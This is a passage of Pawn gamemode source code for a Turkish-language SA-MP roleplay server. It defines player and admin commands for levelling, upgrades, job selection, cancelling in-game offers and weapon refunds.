		new	szMessage[73];

		format(szMessage, sizeof(szMessage), "Geliþtirmelerini sýfýrladýn - Þu an %i tane kullanýlmamýþ geliþtirme puanýn var.",PlayerInfo[playerid][gPupgrade]);
		SendClientMessage(playerid, COLOR_GRAD2, szMessage);
	}
	return 1;
}

CMD:leaders(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 4)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		SendClientMessage(playerid, COLOR_WHITE, "Online kuruluþ liderleri:");

		new	string[128], sz_FacInfo[3][64];

		foreach(Player, i) if(PlayerInfo[i][pLeader] >= 1) {
			GetPlayerFactionInfo(i, sz_FacInfo[0], sz_FacInfo[1], sz_FacInfo[2]);
			format(string, sizeof(string), "(%s) %s %s", sz_FacInfo[2], sz_FacInfo[0], GetPlayerNameEx(i));
			SendClientMessage(playerid, COLOR_GRAD2, string);
		}
	}
	return 1;
}
CMD:navigasyon(playerid, params[])
{
    ShowPlayerDialogEx(playerid, HARITA, DIALOG_STYLE_LIST, "Yer Seç", "LSPD\nFBI\nLSFMD\nLS Merkez\nPizzacý\nKamyoncu\nVIP Mekaný\nDMV Binasý", "Git", "Vazgeç");
    return 1;
}

CMD:meslekler(playerid, params[])
{
	if(CheckPointCheck(playerid))
	{
 		SendClientMessage(playerid, COLOR_WHITE, "Þu anki checkpoint'inizin iptal edildiðinden emin olun (Materyal paketleriniz veya mevcut checkpoint'iniz olabilir).");
   		return 1;
   	}
	ShowPlayerDialogEx(playerid, FINDJOB, DIALOG_STYLE_LIST, "Meslek seç", "Dedektif\nAvukat\nHayat Kadýný\nUyuþturucu Satýcýsý\nTamirci\nBodyguard\nSilah Satýcýsý\nBoksör\nUyuþturucu Kaçakçýsý\nZanaatkar\nBarmen\nKamyon Þoförü\nPizzacý\nBalýkçý", "Seç", "Iptal");
    return 1;
}

CMD:tokalas(playerid, params[])
{
	new string[128], giveplayerid, style;
	if(sscanf(params, "ud", giveplayerid, style)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /tokalas [Oyuncu ID/Ýsim] [style (1-8)]");

	if(IsPlayerConnected(giveplayerid))
	{
		if(giveplayerid == playerid)
		{
			SendClientMessage(playerid, COLOR_GREY, "Kendi elinle tokalaþamazsýn.");
			return 1;
		}
		if(style > 0 && style < 11)
		{
			new Float: ppFloats[3];

			GetPlayerPos(giveplayerid, ppFloats[0], ppFloats[1], ppFloats[2]);

			if(!IsPlayerInRangeOfPoint(playerid, 5, ppFloats[0], ppFloats[1], ppFloats[2]))
			{
				SendClientMessage(playerid, COLOR_GREY, "Çok uzaktasýn. Þu an el sýkýþamazsýn.");
				return 1;
			}

			ShakeHandRequest[giveplayerid] = playerid;
			ShakeHandStyle[giveplayerid] = style;

			PreloadAnims(giveplayerid);
			PreloadAnims(playerid);

			format(string, sizeof(string), " %s kiþisinin elini sýkmak istediniz, yanýt vermesi için bekleyin.", GetPlayerNameEx(giveplayerid));
			SendClientMessage(playerid, COLOR_WHITE, string);

			format(string, sizeof(string), "%s kiþisi elinizi sýkmak istedi, kabul etmek için '/kabulet tokalas' .", GetPlayerNameEx(playerid));
			SendClientMessage(giveplayerid, COLOR_WHITE, string);
		}
		else
		{
			SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /tokalas [Oyuncu ID/Ýsim] [style (1-8)]");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");
	}
	return 1;
}

CMD:levelatla(playerid, params[])
{
	if(gPlayerLogged[playerid] != 0)
	{
		if(PlayerInfo[playerid][pLevel] >= 0)
		{
			new nxtlevel = PlayerInfo[playerid][pLevel]+1;
			new costlevel = nxtlevel*2500;
			new expamount = nxtlevel*levelexp;

			if(GetPlayerCash(playerid) < costlevel)
			{
				new string[128];
				format(string, sizeof(string), "Yeterli paran yok ($%d).",costlevel);
				SendClientMessage(playerid, COLOR_GRAD1, string);
				return 1;
			}
			else if(PlayerInfo[playerid][pRespect] < expamount)
			{
				new string[58];
				format(string, sizeof(string), "Bir sonraki leveli almak için %d onur puaný daha gerekli.", expamount - PlayerInfo[playerid][pRespect]);
				SendClientMessage(playerid, COLOR_GRAD1, string);
				return 1;
			}
			else
			{
				new string[92];
				format(string, sizeof(string), "~g~LEVEL ATLADIN~n~~w~Level %d oldun", nxtlevel);
				PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
				GivePlayerCash(playerid, (-costlevel));
				PlayerInfo[playerid][pLevel]++;
				PlayerInfo[playerid][pRespect] = PlayerInfo[playerid][pRespect]-expamount;
				PlayerInfo[playerid][gPupgrade] = PlayerInfo[playerid][gPupgrade]+2;
				GameTextForPlayer(playerid, string, 5000, 1);
				format(string, sizeof(string), "Level %d, $%d fiyata satýn aldýn ve %i geliþtirme puaný kazandýn! /gelisim komutu ile kullanabilirsin.", nxtlevel, costlevel, PlayerInfo[playerid][gPupgrade]);
				SendClientMessage(playerid, COLOR_GRAD1, string);
				SetPlayerScore(playerid, PlayerInfo[playerid][pLevel]);
			}
		}
		return 1;
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Giriþ yapmadýn.");
	}
	return 1;
}

CMD:gelisim(playerid, params[])
{
	if(isnull(params))
	{
		new string[64];
		format(string, sizeof(string), "KULLANIM: /gelisim [upgradename] ( %d geliþtirme puanýn var).",PlayerInfo[playerid][gPupgrade]);
		SendClientMessage(playerid, COLOR_GREEN,"_______________________________________");
		SendClientMessage(playerid, COLOR_WHITE,"*** GELISTIRMELER ***");
		SendClientMessage(playerid, COLOR_GRAD2,string);
		//SendClientMessage(playerid, COLOR_GRAD5, "armor gunlocker gunlocker2 cargunlocker");
		SendClientMessage(playerid, COLOR_GRAD5, "armor gunlocker cargunlocker");
		SendClientMessage(playerid, COLOR_GREEN,"_______________________________________");
		return 1;
	}
	if(PlayerInfo[playerid][gPupgrade] >= 1)
	{
		if(PlayerInfo[playerid][pLevel] >= 1 && strcmp(params, "armor", true) == 0)
		{
			if(PlayerInfo[playerid][pSarmor] < 100)
			{
				new string[51];
				++PlayerInfo[playerid][pSarmor];
				PlayerInfo[playerid][gPupgrade]--;
				format(string, sizeof(string), "Yeni Geliþtirme: Artýk %.2f zýrh ile doðacaksýn.",PlayerInfo[playerid][pSarmor]);
				SendClientMessage(playerid, COLOR_GRAD6, string);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD6, "   Maksimum doðma zýrhýna sahipsin..");
				return 1;
			}
		}
		else if(strcmp(params, "gunlocker", true) == 0)
		{
			new playername[MAX_PLAYER_NAME];
			GetPlayerName(playerid, playername, sizeof(playername));
			if(PlayerInfo[playerid][pHouse] != INVALID_HOUSE_ID && strcmp(playername, HouseInfo[PlayerInfo[playerid][pHouse]][hOwner], true) == 0)
			{
				if(PlayerInfo[playerid][gPupgrade] < 2)
				{
					SendClientMessage(playerid, COLOR_GRAD6, "   Silah dolabýný geliþtirmek için en az 2 onur puanýna ihtiyacýn var.");
					return 1;
				}
				switch(HouseInfo[PlayerInfo[playerid][pHouse]][hGLUpgrade])
				{
					case 0:
					{
						if(PlayerInfo[playerid][pCash] >= 5000)
						{
							PlayerInfo[playerid][pCash] -= 5000;
							HouseInfo[PlayerInfo[playerid][pHouse]][hGLUpgrade] = 1;
							HouseInfo[PlayerInfo[playerid][pHouse]][hWeapons][0] = 0;
							SendClientMessage(playerid, COLOR_WHITE, "Yeni bir silah slotu satýn aldýn, $5000 ile ücretlendirildi.");
							SendClientMessage(playerid, COLOR_GRAD2, "IPUCU: Dolaplarýný kullanmak için, komutlarýn /esilahsakla ve /esilahal. 1 dolap slotu kullanýlabilir durumda.");
						}
						else
						{
							SendClientMessage(playerid, COLOR_WHITE, "Yeterli paran yok ($5000).");
							return 1;
						}
					}
					case 1:
					{
						if(PlayerInfo[playerid][pCash] >= 5000)
						{
							PlayerInfo[playerid][pCash] -= 5000;
							HouseInfo[PlayerInfo[playerid][pHouse]][hGLUpgrade]++;
							HouseInfo[PlayerInfo[playerid][pHouse]][hWeapons][1] = 0;
							SendClientMessage(playerid, COLOR_WHITE, "Yeni bir silah slotu satýn aldýn, $5000 ile ücretlendirildi.");
							SendClientMessage(playerid, COLOR_GRAD2, "IPUCU: Dolaplarýný kullanmak için, komutlarýn /esilahsakla ve /esilahal. 2 dolap slotu kullanýlabilir durumda.");
						}
						else
						{
							SendClientMessage(playerid, COLOR_WHITE, "Yeterli paran yok ($5000).");
							return 1;
						}
					}
					case 2:
					{
						if(PlayerInfo[playerid][pCash] >= 5000)
						{
							PlayerInfo[playerid][pCash] -= 5000;
							HouseInfo[PlayerInfo[playerid][pHouse]][hGLUpgrade]++;
							HouseInfo[PlayerInfo[playerid][pHouse]][hWeapons][2] = 0;
							SendClientMessage(playerid, COLOR_WHITE, "Yeni bir silah slotu satýn aldýn, $5000 ile ücretlendirildi.");
							SendClientMessage(playerid, COLOR_GRAD2, "IPUCU: Dolaplarýný kullanmak için, komutlarýn /esilahsakla ve /esilahal. 3 dolap slotu kullanýlabilir durumda.");
						}
						else
						{
							SendClientMessage(playerid, COLOR_WHITE, "Yeterli paran yok ($5000).");
							return 1;
						}
					}
					case 3:
					{
						if(PlayerInfo[playerid][pCash] >= 5000)
						{
							PlayerInfo[playerid][pCash] -= 5000;
							HouseInfo[PlayerInfo[playerid][pHouse]][hGLUpgrade]++;
							HouseInfo[PlayerInfo[playerid][pHouse]][hWeapons][3] = 0;
							SendClientMessage(playerid, COLOR_WHITE, "Yeni bir silah slotu satýn aldýn, $5000 ile ücretlendirildi.");
							SendClientMessage(playerid, COLOR_GRAD2, "IPUCU: Dolaplarýný kullanmak için, komutlarýn /esilahsakla ve /esilahal. 4 dolap slotu kullanýlabilir durumda.");
						}
						else
						{
							SendClientMessage(playerid, COLOR_WHITE, "Yeterli paran yok ($5000).");
							return 1;
						}
					}
					case 4:
					{
						if(PlayerInfo[playerid][pCash] >= 5000)
						{
							PlayerInfo[playerid][pCash] -= 5000;
							HouseInfo[PlayerInfo[playerid][pHouse]][hGLUpgrade]++;
							HouseInfo[PlayerInfo[playerid][pHouse]][hWeapons][4] = 0;
							SendClientMessage(playerid, COLOR_WHITE, "Yeni bir silah slotu satýn aldýn, $5000 ile ücretlendirildi.");
							SendClientMessage(playerid, COLOR_GRAD2, "IPUCU: Dolaplarýný kullanmak için, komutlarýn /esilahsakla ve /esilahal. 5 dolap slotu kullanýlabilir durumda.");
						}
						else
						{
							SendClientMessage(playerid, COLOR_WHITE, "Yeterli paran yok ($5000).");
							return 1;
						}
					}
					case 5:
					{
						SendClientMessage(playerid, COLOR_WHITE, "Üzgünüm, kullanýlabilir durumda boþ slot yok.");
						return 1;
					}
				}
				PlayerInfo[playerid][gPupgrade] -= 2;
				SaveHouses();
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Bir ev sahibi deðilsin.");
				return 1;
			}
		}
		// Second houses disabled for now
		/*else if(strcmp(params, "gunlocker2", true) == 0)
		{
			new playername[MAX_PLAYER_NAME];
			GetPlayerName(playerid, playername, sizeof(playername));
			if(PlayerInfo[playerid][pHouse2] != INVALID_HOUSE_ID && strcmp(playername, HouseInfo[PlayerInfo[playerid][pHouse2]][hOwner], true) == 0)
			{
				if(PlayerInfo[playerid][gPupgrade] < 2)
				{
					SendClientMessage(playerid, COLOR_GRAD6, "   You need at least 2 respect points.");
					return 1;
				}
				switch(HouseInfo[PlayerInfo[playerid][pHouse2]][hGLUpgrade])
				{
					case 0:
					{
						if(PlayerInfo[playerid][pCash] >= 5000)
						{
							PlayerInfo[playerid][pCash] -= 5000;
							HouseInfo[PlayerInfo[playerid][pHouse2]][hGLUpgrade] = 1;
							HouseInfo[PlayerInfo[playerid][pHouse2]][hWeapons][0] = 0;
							SendClientMessage(playerid, COLOR_WHITE, "Yeni bir silah slotu satýn aldýn, $5000 ile ücretlendirildi.");
							SendClientMessage(playerid, COLOR_GRAD2,"IPUCU: To use your lockers, the commands are /esilahsakla and /esilahal. You have 1 locker space available.");
						}
						else
						{
							SendClientMessage(playerid, COLOR_WHITE, "Yeterli paran yok ($5000).");
							return 1;
						}
					}
					case 1:
					{
						if(PlayerInfo[playerid][pCash] >= 5000)
						{
							PlayerInfo[playerid][pCash] -= 5000;
							HouseInfo[PlayerInfo[playerid][pHouse2]][hGLUpgrade]++;
							HouseInfo[PlayerInfo[playerid][pHouse2]][hWeapons][1] = 0;
							SendClientMessage(playerid, COLOR_WHITE, "Yeni bir silah slotu satýn aldýn, $5000 ile ücretlendirildi.");
							SendClientMessage(playerid, COLOR_GRAD2,"IPUCU: To use your lockers, the commands are /esilahsakla and /esilahal. You have 2 locker space available.");
						}
						else
						{
							SendClientMessage(playerid, COLOR_WHITE, "Yeterli paran yok ($5000).");
							return 1;
						}
					}
					case 2:
					{
						if(PlayerInfo[playerid][pCash] >= 5000)
						{
							PlayerInfo[playerid][pCash] -= 5000;
							HouseInfo[PlayerInfo[playerid][pHouse2]][hGLUpgrade]++;
							HouseInfo[PlayerInfo[playerid][pHouse2]][hWeapons][2] = 0;
							SendClientMessage(playerid, COLOR_WHITE, "Yeni bir silah slotu satýn aldýn, $5000 ile ücretlendirildi.");
							SendClientMessage(playerid, COLOR_GRAD2,"IPUCU: To use your lockers, the commands are /esilahsakla and /esilahal. You have 3 locker space available.");
						}
						else
						{
							SendClientMessage(playerid, COLOR_WHITE, "Yeterli paran yok ($5000).");
							return 1;
						}
					}
					case 3:
					{
						if(PlayerInfo[playerid][pCash] >= 5000)
						{
							PlayerInfo[playerid][pCash] -= 5000;
							HouseInfo[PlayerInfo[playerid][pHouse2]][hGLUpgrade]++;
							HouseInfo[PlayerInfo[playerid][pHouse2]][hWeapons][3] = 0;
							SendClientMessage(playerid, COLOR_WHITE, "Yeni bir silah slotu satýn aldýn, $5000 ile ücretlendirildi.");
							SendClientMessage(playerid, COLOR_GRAD2,"IPUCU: To use your lockers, the commands are /esilahsakla and /esilahal. You have 4 locker space available.");
						}
						else
						{
							SendClientMessage(playerid, COLOR_WHITE, "Yeterli paran yok ($5000).");
							return 1;
						}
					}
					case 4:
					{
						if(PlayerInfo[playerid][pCash] >= 5000)
						{
							PlayerInfo[playerid][pCash] -= 5000;
							HouseInfo[PlayerInfo[playerid][pHouse2]][hGLUpgrade]++;
							HouseInfo[PlayerInfo[playerid][pHouse2]][hWeapons][4] = 0;
							SendClientMessage(playerid, COLOR_WHITE, "Yeni bir silah slotu satýn aldýn, $5000 ile ücretlendirildi.");
							SendClientMessage(playerid, COLOR_GRAD2,"IPUCU: To use your lockers, the commands are /esilahsakla and /esilahal. You have 5 locker space available.");
						}
						else
						{
							SendClientMessage(playerid, COLOR_WHITE, "Yeterli paran yok ($5000).");
							return 1;
						}
					}
					case 5:
					{
						SendClientMessage(playerid, COLOR_WHITE, "Sorry, there are no more spaces available.");
						return 1;
					}
				}
				PlayerInfo[playerid][gPupgrade]--;
				SaveHouses();
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD2, " You don't own a second house.");
				return 1;
			}
		}*/
		else if(strcmp(params, "cargunlocker", true) == 0)
		{
			new Float: x, Float: y, Float: z;
			for(new d = 0 ; d < MAX_PLAYERVEHICLES; d++)
			{
				if(PlayerVehicleInfo[playerid][d][pvId] != INVALID_PLAYER_VEHICLE_ID) GetVehiclePos(PlayerVehicleInfo[playerid][d][pvId], x, y, z);
				if(IsPlayerInRangeOfPoint(playerid, 3.0, x, y, z))
				{
					if(PlayerInfo[playerid][gPupgrade] < 2)
					{
						SendClientMessage(playerid, COLOR_GRAD6, "   En az 2 onur puanýna ihtiyacýn var.");
						return 1;
					}
					if(PlayerVehicleInfo[playerid][d][pvWepUpgrade] < 2)
					{
						new string[114];
						GameTextForPlayer(playerid,"~r~Araç Silah Dolabý Geliþtirildi!",5000,6);
						PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
						PlayerVehicleInfo[playerid][d][pvWepUpgrade]++;
						PlayerInfo[playerid][gPupgrade] = PlayerInfo[playerid][gPupgrade]-2;
						SendClientMessage(playerid, COLOR_WHITE, "Yeni bir araç dolap slotu satýn aldýn.");
						format(string, sizeof(string), "IPUCU: Araç dolaplarýný kullanmak için, komutlarýn /aracakoy ve /aractanal. %d adet kullanýlabilir slotun var.", PlayerVehicleInfo[playerid][d][pvWepUpgrade]+1);
						SendClientMessage(playerid, COLOR_GRAD2, string);
						return 1;
					}
					else
					{
						SendClientMessage(playerid, COLOR_GREY, "Araç silah slotlarýný zaten geliþtirdin.");
						return 1;
					}
				}
			}
			SendClientMessage(playerid, COLOR_GREY, "Sahip olduðun arabalara/arabaya yakýn deðilsin.");
			return 1;
		}
		else
		{
			SendClientMessage(playerid, COLOR_GRAD6, "   Tanýmlanamayan geliþtirme.");
			return 1;
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD6, "   Hiç geliþtirme puanýn yok.");
		return 1;
	}
	return 1;
}

CMD:raporiptal(playerid, params[]) return cmd_iptal(playerid, "report");

CMD:iptal(playerid, params[])
{
	new
		string[128],
		choice[32];
	if(sscanf(params, "s[32]", choice))
	{
		SendClientMessage(playerid, COLOR_WHITE, "|__________________ Cancel __________________|");
		SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /iptal [name]");
		SendClientMessage(playerid, COLOR_GREY, "Kullanýlabilir Isimler: Sex, Materyal, Pot, Crack, Silah, Zanaat, Tamir, Avukat, Bodyguard, Arac, Dovus, Canliyayin, Rapor");
		SendClientMessage(playerid, COLOR_GREY, "Kullanýlabilir Isimler: Taksi, Otobus, Doktor, Tamirci, Ceza, Sahitlik, Evlilik, Bosanmak, Icki, Ev, Kamyoncu");
		SendClientMessage(playerid, COLOR_WHITE, "|____________________________________________|");
		return 1;
	}

	if(strcmp(choice,"sex",true) == 0) { SexOffer[playerid] = 999; SexPrice[playerid] = 0; }
	else if(strcmp(choice,"canliyayin",true) == 0) {
		if(TalkingLive[playerid] != INVALID_PLAYER_ID || LiveOffer[playerid] != INVALID_PLAYER_ID ) {
			cmd_yayinaal(TalkingLive[playerid], "");
			TalkingLive[TalkingLive[playerid]] = INVALID_PLAYER_ID;
			TalkingLive[LiveOffer[playerid]] = INVALID_PLAYER_ID;
			LiveOffer[LiveOffer[playerid]] = INVALID_PLAYER_ID;
			LiveOffer[TalkingLive[playerid]] = INVALID_PLAYER_ID;
		}
		TalkingLive[playerid] = INVALID_PLAYER_ID;
		LiveOffer[playerid] = INVALID_PLAYER_ID;
	}
	else if(strcmp(choice,"materyal",true) == 0) { MatsOffer[playerid] = 999; MatsPrice[playerid] = 0; MatsAmount[playerid] = 0; }
	else if(strcmp(choice,"pot",true) == 0) { PotOffer[playerid] = 999; PotPrice[playerid] = 0; PotGram[playerid] = 0; }
	else if(strcmp(choice,"crack",true) == 0) {  CrackOffer[playerid] = 999;  CrackPrice[playerid] = 0; CrackGram[playerid] = 0; }
	else if(strcmp(choice,"silah",true) == 0) { GunOffer[playerid] = 999; GunId[playerid] = 0; }
	else if(strcmp(choice,"zanaat",true) == 0) { CraftOffer[playerid] = 999; CraftId[playerid] = 0; }
	else if(strcmp(choice,"tamir",true) == 0) {	RepairOffer[playerid] = 999; RepairPrice[playerid] = 0; RepairCar[playerid] = 0; }
	else if(strcmp(choice,"avukat",true) == 0) { WantLawyer[playerid] = 0; CallLawyer[playerid] = 0; }
	else if(strcmp(choice,"bodyguard",true) == 0) { GuardOffer[playerid] = 999; GuardPrice[playerid] = 0; }
	else if(strcmp(choice,"arac",true) == 0) { VehicleOffer[playerid] = 999; VehiclePrice[playerid] = 0; VehicleId[playerid] = -1; }
	else if(strcmp(choice,"ev",true) == 0) { HouseOffer[playerid] = 999; HousePrice[playerid] = 0; House[playerid] = 0; }
	else if(strcmp(choice,"dovus",true) == 0) { BoxOffer[playerid] = 999; }
	else if(strcmp(choice,"sahitlik",true) == 0) { MarryWitnessOffer[playerid] = 999; }
	else if(strcmp(choice,"evlilik",true) == 0) { ProposeOffer[playerid] = 999; }
	else if(strcmp(choice,"bosanmak",true) == 0) { DivorceOffer[playerid] = 999; }
	else if(strcmp(choice,"icki",true) == 0) { DrinkOffer[playerid] = INVALID_PLAYER_ID; }
	else if(strcmp(choice,"rapor",true) == 0) {
		for(new i = 0; i < MAX_REPORTS; i++)
		{
			if(Reports[i][ReportFrom] == playerid && Reports[i][BugReport] == 0)
			{
				Reports[i][ReportFrom] = 999;
				Reports[i][BeingUsed] = 0;
				Reports[i][TimeToExpire] = 0;
			}
		}
	}
	else if(strcmp(choice,"kamyoncu",true) == 0) {
 		DestroyProgressBar(LoadTruckBar[playerid]);
		LoadTruckBar[playerid] = INVALID_BAR_ID;
		LoadTruckTime[playerid] = 0;
		DeletePVar(playerid, "TruckDeliver");
		TruckUsed[playerid] = INVALID_VEHICLE_ID;
		gPlayerCheckpointStatus[playerid] = CHECKPOINT_NONE;
 		DisablePlayerCheckpoint(playerid);
	}
	else if(strcmp(choice,"kontrakt",true) == 0) {
		new Float:X, Float:Y, Float:Z;
		GetPlayerPos(playerid, X, Y, Z);

 		if(!IsPlayerInRangeOfPoint(GoChase[playerid], 225, X, Y, Z))
 		{
			new Float:health;
			GetPlayerHealth(playerid, health);
			new hpint = floatround(health, floatround_round);
			if(hpint >=  80)
			{
				HitToGet[playerid] = 999;
				HitOffer[playerid] = 999;
				GetChased[GoChase[playerid]] = 999;
				GotHit[GoChase[playerid]] = 0;
				GoChase[playerid] = 999;
			} else return SendClientMessage(playerid, COLOR_GRAD1, "Canýn 80'in altýndaysa kontratý iptal edemezsin!");
		} else return SendClientMessage(playerid, COLOR_GRAD1, "Kontratý iptal etmek için hedefe çok yakýnsýn. Hedefle aranda daha fazla mesafe olmalý.");
	}
	else if(strcmp(choice,"ceza",true) == 0) { TicketOffer[playerid] = 999; TicketMoney[playerid] = 0; }
	else if(strcmp(choice,"doktor",true) == 0) { if(IsPlayerConnected(MedicCall)) { if(MedicCall == playerid) { MedicCall = 999; } else { SendClientMessage(playerid, COLOR_GREY, "   Þu anki arayan sen deðilsin!"); return 1; } } }
	else if(strcmp(choice,"tamirci",true) == 0) { if(IsPlayerConnected(MechanicCall)) { if(MechanicCall == playerid) { MechanicCall = 999; } else { SendClientMessage(playerid, COLOR_GREY, "   Þu anki arayan sen deðilsin!"); return 1; } } }
	else if(strcmp(choice,"taksi",true) == 0)
	{
		if(TaxiCall < 999)
		{
			if(TransportDuty[playerid] == 1 && TaxiCallTime[playerid] > 0)
			{
				TaxiAccepted[playerid] = 999;
				GameTextForPlayer(playerid, "~w~Çaðrýyý~n~~r~Iptal ettin", 5000, 1);
				TaxiCallTime[playerid] = 0;
				DisablePlayerCheckpoint(playerid);
				TaxiCall = 999;
			}
			else
			{
				if(IsPlayerConnected(TaxiCall)) { if(TaxiCall == playerid) { TaxiCall = 999; } }
				foreach(Player, i)
				{
					if(TaxiAccepted[i] < 999)
					{
						if(TaxiAccepted[i] == playerid)
						{
							TaxiAccepted[i] = 999;
							GameTextForPlayer(i, "~w~Taksi çaðýran kiþi~n~~r~çaðrýyý iptal etti", 5000, 1);
							TaxiCallTime[i] = 0;
							DisablePlayerCheckpoint(i);
						}
					}
				}
			}
		}
	}
	else if(strcmp(choice,"otobus",true) == 0)
	{
		if(BusCall < 999)
		{
			if(TransportDuty[playerid] == 2 && BusCallTime[playerid] > 0)
			{
				BusAccepted[playerid] = 999;
				GameTextForPlayer(playerid, "~w~Çaðrýyý~n~~r~iptal ettin", 5000, 1);
				BusCallTime[playerid] = 0;
				DisablePlayerCheckpoint(playerid);
				BusCall = 999;
			}
			else
			{
				if(IsPlayerConnected(BusCall)) { if(BusCall == playerid) { BusCall = 999; } }
				foreach(Player, i)
				{
					if(BusAccepted[i] < 999)
					{
						if(BusAccepted[i] == playerid)
						{
							BusAccepted[i] = 999;
							GameTextForPlayer(i, "~w~Otobüs çaðýran kiþi~n~~r~çaðrýyý iptal etti", 5000, 1);
							BusCallTime[i] = 0;
							DisablePlayerCheckpoint(i);
						}
					}
				}
			}
		}
	}
	else return cmd_iptal(playerid, "");
	format(string, sizeof(string), "* Iptal ettin: %s.", choice);
	SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	return 1;
}

CMD:silahlarim(playerid, params[])
{
	new string[128], myweapons[13][2], weaponname[50], encryption[256], name[MAX_PLAYER_NAME];

	GetPlayerName(playerid, name, sizeof(name));
	SendClientMessage(playerid, COLOR_GREEN,"_______________________________________");
	format(string, sizeof(string), " %s silahlarý: ( %d)", name, gettime());
	SendClientMessage(playerid, COLOR_WHITE, string);
	for (new i = 0; i < 13; i++)
	{
		GetPlayerWeaponData(playerid, i, myweapons[i][0], myweapons[i][1]);
		if(myweapons[i][0] > 0)
		{
			if(PlayerInfo[playerid][pGuns][i] == myweapons[i][0])
			{
				GetWeaponName(myweapons[i][0], weaponname, sizeof(weaponname));
				format(string, sizeof(string), "%s (%d)", weaponname, myweapons[i][0]);
				SendClientMessage(playerid, COLOR_GRAD1, string);
				format(encryption, sizeof(encryption), "%s%d", encryption, myweapons[i][0]);
			}
		}
	}
	new year, month, day, hour, minute, second;
	getdate(year, month, day);
	gettime(hour, minute, second);
	format(encryption, sizeof(encryption), "%s%s%d%d%d%d%d6524", encryption, name, month, day, year, hour, minute);
	new encrypt = crc32(encryption);
	format(string, sizeof(string), "[%d/%d/%d %d:%d:%d] - [%d]", month, day, year, hour, minute,second, encrypt);
	SendClientMessage(playerid, COLOR_GREEN, string);
	SendClientMessage(playerid, COLOR_GREEN,"_______________________________________");
	return 1;
}

CMD:aractanat(playerid, params[])
{
	new State;
	if(IsPlayerInAnyVehicle(playerid))
	{
		State=GetPlayerState(playerid);
		if(State!=PLAYER_STATE_DRIVER)
		{
			SendClientMessage(playerid,COLOR_GREY,"   Þoför olarak sadece oturanlarý atabilirsin!");
			return 1;
		}

		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /aractanat [Oyuncu ID/Ýsim]");

		new test;
		test = GetPlayerVehicleID(playerid);
		if(IsPlayerConnected(giveplayerid))
		{
			if(giveplayerid != INVALID_PLAYER_ID)
			{
				if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "Kendini atamazsýn!"); return 1; }
				if(IsPlayerInVehicle(giveplayerid,test))
				{
					if(GetPVarInt(giveplayerid, "EMSAttempt") != 0) return SendClientMessage(playerid, COLOR_GRAD2, "Hastalarý atamazsýn!");
					format(string, sizeof(string), "* %s kiþisini araçtan attýn.", GetPlayerNameEx(giveplayerid));
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* %s tarafýndan araçtan atýldýn.", GetPlayerNameEx(playerid));
					SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					RemovePlayerFromVehicle(giveplayerid);
					format(string, sizeof(string), "* %s, %s kiþisini araçtan attý.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY, "   Oyuncu arabada deðil!");
					return 1;
				}
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "   Bunu kullanabilmek için bir araçta olman gerek!");
	}
	return 1;
}

CMD:refund(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] < 6)
	{
        SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
        return 1;
	}
	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
		return 1;
   	}

	new string[128], giveplayerid, item[32], amount;
	if(sscanf(params, "us[32]d", giveplayerid, item, amount))
	{
		SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /refund [playerid] [item] [weapon ID or amount]");
		SendClientMessage(playerid, COLOR_GREY, "Kullanýlabilir Eþyalar: Gun, Mats, Pot, Crack");
  		SendClientMessage(playerid, COLOR_GREEN, "_______________________________________");
    	SendClientMessage(playerid, COLOR_GRAD4, "1: Brass Knuckles 2: Golf Club 3: Nite Stick 4: Knife 5: Baseball Bat 6: Shovel 7: Pool Cue 8: Katana");
     	SendClientMessage(playerid, COLOR_GRAD4, "10: Purple Dildo 11: Small White Vibrator 12: Large White Vibrator 13: Silver Vibrator 14: Flowers(Buglu) 15: Cane");
      	SendClientMessage(playerid, COLOR_GRAD3, "22: 9mm 23: Silenced 9mm 24: Desert Eagle 27: Combat Shotgun 28: Micro SMG (Mac 10) 29: SMG (MP5)");
       	SendClientMessage(playerid, COLOR_GRAD4, " 30: AK-47 31: M4 32: Tec9 33: Rifle 25: Shotgun 34: Sniper Rifle ");
       	SendClientMessage(playerid, COLOR_GREEN, "_______________________________________");
		return 1;
	}

	new sstring[128];
	if(strcmp(item, "gun", true) == 0)
	{
        if(amount < 1 || amount > 34 || amount == 9 || (amount >= 16 && amount <= 21) || amount == 26)
        { SendClientMessage(playerid, COLOR_GRAD1, "Bu silahý iade edemezsin!"); return 1; }

        if(IsPlayerConnected(giveplayerid)) {
            if(PlayerInfo[giveplayerid][pConnectTime] < 2 && amount != 46 && amount != 43) return SendClientMessage(playerid, COLOR_GRAD2, "Bu oyuncunun silah taþýmasý yasaklanmýþ");
            if(giveplayerid != INVALID_PLAYER_ID)
			{
